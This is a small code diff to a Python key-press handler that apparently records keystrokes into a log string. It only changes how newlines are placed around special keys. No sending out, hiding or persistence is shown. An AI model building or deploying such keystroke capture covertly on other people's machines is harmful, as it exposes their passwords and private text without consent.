@@ -29,9 +29,13 @@ def on_press(key):
             if key == Key.space:
                 logstring += " "
             else:
-                logstring += "\n"
-                logstring += str(key).strip("'")
-                logstring += "\n"
+                if len(logstring) > 1:
+                    logstring += "\n"
+                    logstring += str(key).strip("'")
+                else:
+                    logstring += str(key).strip("'")
+                    logstring += "\n"
+
         else: 
             logstring += str(key).strip("'")
     else:
